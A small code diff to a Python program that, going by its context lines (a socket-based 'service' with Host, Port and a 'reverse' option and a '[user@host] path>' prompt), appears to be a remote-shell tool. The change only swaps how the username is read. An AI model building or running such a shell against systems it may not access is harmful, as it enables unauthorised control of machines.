@@ -3,9 +3,9 @@ import socket
 import os,sys
 import platform
 import subprocess
-import argparse
 import json
 import struct
+import getpass
 
 class service(object):
     def __init__(self,Host,Port,reverse):
@@ -36,7 +36,7 @@ class service(object):
             self.socket = sockets
             while not stop:
                 path= os.getcwd()
-                user = os.environ['USERNAME']
+                user = getpass.getuser()
                 host_name = socket.gethostname()
                 info = "[{}@{}] {}>\n>".format(user,host_name,path)
                 try:
